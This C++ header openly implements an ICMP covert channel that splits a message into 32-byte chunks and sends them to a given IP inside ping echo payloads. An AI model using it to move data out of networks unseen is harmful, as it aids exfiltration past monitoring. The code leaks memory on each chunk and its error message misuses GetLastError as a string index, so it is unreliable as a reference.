//
// Created by sinat on 3/9/2024.
//

#ifndef SETICMP_H
#define SETICMP_H
#include <winsock2.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#include <iostream>
#include <stdexcept>
class covert_handler{
public:
    explicit covert_handler(std::string& ip) : ip(ip)
    {
        ipaddr = inet_addr(ip.c_str());
        if (ipaddr == INADDR_NONE) {
            throw std::runtime_error("Invalid IP address");
        }
        hIcmpFile = IcmpCreateFile();
        if (hIcmpFile == INVALID_HANDLE_VALUE) {
            throw std::runtime_error("Failed to create ICMP file handle");
        }
    }
    ~covert_handler(){
        IcmpCloseHandle(hIcmpFile);
    }
    char* send_covert_message(char* message){
        size_t chunk_size = 32;
        size_t message_size = strlen(message);
        for (size_t offset = 0 ; offset < message_size ; offset+=chunk_size)
        {
            char SendData[32] = {0};
            size_t bytes_to_copy = std::min(chunk_size, message_size - offset);
            memcpy(SendData, message + offset, bytes_to_copy);

            ReplySize = sizeof(ICMP_ECHO_REPLY) + sizeof(SendData);
            ReplyBuffer = (VOID*) malloc(ReplySize);
            if (ReplyBuffer == nullptr) {
                throw std::runtime_error("Failed to allocate memory for reply buffer");
            }
            dwRetVal = IcmpSendEcho(hIcmpFile,
                                    ipaddr,
                                    SendData,
                                    sizeof(SendData),
                                    nullptr,
                                    ReplyBuffer,
                                    ReplySize,
                                    1000);

            if (dwRetVal != 0) {
                auto pEchoReply = (PICMP_ECHO_REPLY)ReplyBuffer;
                struct in_addr ReplyAddr{};
                ReplyAddr.S_un.S_addr = pEchoReply->Address;
                std::cout << "Reply from\n" << inet_ntoa(ReplyAddr) << '\n'
                          <<"is : " << (char*)pEchoReply->Data << '\n';
            } else {
                throw std::runtime_error(&"Failed to send ICMP message "[GetLastError()]);
            }
        }
        return nullptr;
    }
private:
    std::string ip;

    HANDLE hIcmpFile;
    DWORD dwRetVal = 0;
    unsigned long ipaddr;
    LPVOID ReplyBuffer = nullptr;
    DWORD ReplySize = 0;
};
#endif //SETICMP_H
